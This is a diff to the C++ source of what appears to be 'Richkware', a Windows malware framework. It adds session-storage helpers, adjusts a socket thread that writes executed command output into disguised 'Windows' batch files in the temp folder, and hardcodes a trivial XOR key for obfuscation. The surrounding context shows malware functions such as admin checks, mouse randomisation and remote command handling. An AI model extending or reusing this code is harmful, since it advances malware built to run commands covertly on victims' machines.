@@ -4,6 +4,27 @@
 
 #include "Richkware.h"
 
+void Richkware::SaveInfo(const char* key, const char* value){
+	LoadSession(EncryptionKey);
+	session.insert(std::pair<std::string, std::string>(key,value));
+	SaveSession(EncryptionKey);
+}
+
+std::string Richkware::FindInfo(const char * key){
+	LoadSession(EncryptionKey);
+	std::map<std::string, std::string>::iterator it = session.find(key);
+	if (it != session.end())
+		return it->second;
+	else
+		return "";
+}
+
+void Richkware::RemoveInfo(const char * key){
+	LoadSession(EncryptionKey);
+	session.erase(key);
+	SaveSession(EncryptionKey);
+}
+
 BOOL Richkware::IsAdmin() {
 	BOOL fIsRunAsAdmin = FALSE;
 	DWORD dwError = ERROR_SUCCESS;
@@ -247,9 +268,9 @@ DWORD WINAPI ClientSocketThread(void* arg) {
 	// write the output of command in a file
 	srand((unsigned int)time(0));
 	std::stringstream ss;
-	ss << rand();
+	ss << rand(); // An integer value between 0 and RAND_MAX
 
-	std::string fileName = "Windows" + ss.str(); // An integer value between 0 and RAND_MAX
+	std::string fileName = "Windows" + ss.str(); 
 	char tmp_path[MAX_PATH];
 	GetTempPath(MAX_PATH, tmp_path);
 	std::string fileBat = tmp_path;
@@ -451,8 +472,7 @@ void Richkware::RandMouse() {
 
 // XOR
 std::string EncryptDecrypt(std::string input, const char* key) {
-	int ikey = key[0];
-
+	int ikey = 5;/////////////////////////////////////////////
 	std::string output;
 
 	for (std::string::iterator it = input.begin(); it != input.end(); ++it) {
@@ -495,8 +515,8 @@ void Richkware::LoadSession(const char* EncryptionKey) {
 			tmp = "";
 		}
 		else if (*it == '|') { // end of value
-		 // write key,value into map
-			session[key] = tmp;
+			// write key,value into map
+			session.insert(std::pair<std::string, std::string>(key,tmp));;
 			tmp = "";
 		}
 		else {
